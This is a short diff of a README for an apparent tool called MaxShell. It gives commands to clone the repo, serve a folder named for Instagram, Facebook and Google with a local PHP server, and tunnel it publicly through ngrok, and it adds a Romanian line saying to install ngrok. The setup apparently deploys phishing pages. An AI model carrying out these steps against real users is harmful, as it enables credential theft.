@@ -21,6 +21,7 @@ git clone https://github.com/hacking12345678/MaxShell.git
 <br>cd instagram,facebook,google
 <br>php -S 127.0.0.1:???? < port
 <br> ngrok http ???? < port
+# $ Instalaţi aplicaţia Ngrok 
 ## $ Testat
 <br> 1)ubuntu 21.10
 <br> 2)kali-linux
